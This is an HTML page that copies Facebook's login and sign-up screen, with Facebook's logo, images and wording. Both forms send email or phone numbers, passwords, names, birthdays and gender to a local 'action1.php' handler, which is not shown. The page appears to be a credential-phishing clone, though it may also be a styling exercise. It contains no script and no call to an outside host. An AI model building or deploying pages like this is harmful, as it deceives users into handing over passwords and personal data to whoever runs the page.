<html>
<head>
<title>Facebook- log in or sign up</title>
<link rel="stylesheet" type="text/css" href="mystyles.css">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="utf-8">
</head>
<body style="background-color: #d7dbe1">
<div class="login" background-color:#5362b7>
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7c/Facebook_New_Logo_%282015%29.svg/2000px-Facebook_New_Logo_%282015%29.svg.png" alt="Facebook" width="250" height="100" align="left">
<div class="boxes">
<form action="action1.php" method="POST">
<input type="text" name="Email or Phone" placeholder="Email or Phone" style="padding: 8px 60px 14px 98px;font-size: 15px;">
<input type="password" name="Password" placeholder="Password" style="padding: 8px 60px 14px 98px;font-size: 15px;">
<input type="hidden" name="actionType" value="Log In"/>
<input type="submit" value="Log In" style="background-color: #385899; cursor:pointer">
</form>
<a href="">Forgotten account?</a>
</div>
</div>
<div background-color: #f0fafe;>
<h3 style="color:blue">Facebook helps you connect and share with the people in your life.</h3>
<img src="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/GwFs3_KxNjS.png" height="260px" align="left">
<div class="signup" style="background-color: #d7dbe1">
<h1>Create an account</h1>
<h3>It's free and always will be.</h3>
<form action="action1.php" method="POST">
<input type="text" name="Firstname" placeholder="Firstname" style="padding: 15px 104px 23px 93px;font-size: 24px;border-radius: 13px">
<br>
<input type="text" name="Surname" placeholder="Surname" style="padding: 15px 104px 23px 93px;font-size: 24px;border-radius: 13px">;
<br>
<input type="text" name="Mobile number or email address" placeholder="Mobile number or email address" style="padding: 15px 104px 23px 93px;font-size: 24px;border-radius: 13px">
<br>
<input type="Password" name="Password" placeholder="Password" style="padding: 15px 104px 23px 93px;font-size: 24px;border-radius: 13px">
<br>
<h3>Birthday:</h3>
<input type="date" name="Date" placeholder="Date" style="padding: 15px 104px 23px 93px;font-size: 24px;">
<input type="hidden" name="actionType" value="Sign Up"/>
<div>
<input type="radio" id="Male" name="gender"><label for="male" style="font-size: 39px;">Male</label>
<input type="radio" id="Female" name="gender"><label for="Female" style="font-size: 39px;">Female</label>
<p>By clicking Sign Up, you agree to our Terms, Data Policy and Cookie Policy. <br>You may receive SMS notifications from us and can opt out at any time.</p>
</div>
<input type="submit" value="Sign Up" style="background-color: green;cursor: pointer;font-size: 36px;">
</form>
</div>
</div>
</body>
</html>